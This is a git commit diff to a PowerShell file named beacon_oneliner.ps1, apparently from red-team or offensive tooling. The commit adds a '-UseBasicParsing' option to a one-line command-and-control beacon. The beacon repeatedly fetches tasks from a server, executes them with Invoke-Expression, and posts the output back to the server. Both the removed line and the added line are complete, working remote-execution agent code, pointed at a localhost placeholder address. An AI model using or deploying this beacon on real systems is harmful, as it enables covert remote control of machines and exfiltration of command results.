06393e53eb4b207d71258e9e82f5883b009da7fc
Redh00k-k <jack.frost.6581@gmail.com>
2024-08-24 11:49:23 +0900

    [update] add 'UseBasicParsing' option to Invoke-WebRequest

--- beacon_oneliner.ps1
+++ beacon_oneliner.ps1
@@ -1,2 +1,2 @@
 # Support constrained language mode
-$url="http://127.0.0.1:8888";while ($response = Invoke-WebRequest -Uri $($url + "/tasks.txt") -UseBasicParsing) {$results = Invoke-Expression $response.Content;Invoke-WebRequest -Method Post -Uri $url -Body $($results -join "`r`n") -ContentType "application/text" > $null ;Start-Sleep -Seconds 10}
+$url="http://127.0.0.1:8888";while ($response = Invoke-WebRequest -Uri $($url + "/tasks.txt") -UseBasicParsing) {$results = Invoke-Expression $response.Content;Invoke-WebRequest -Method Post -Uri $url -Body $($results -join "`r`n") -ContentType "application/text" -UseBasicParsing > $null ;Start-Sleep -Seconds 10}
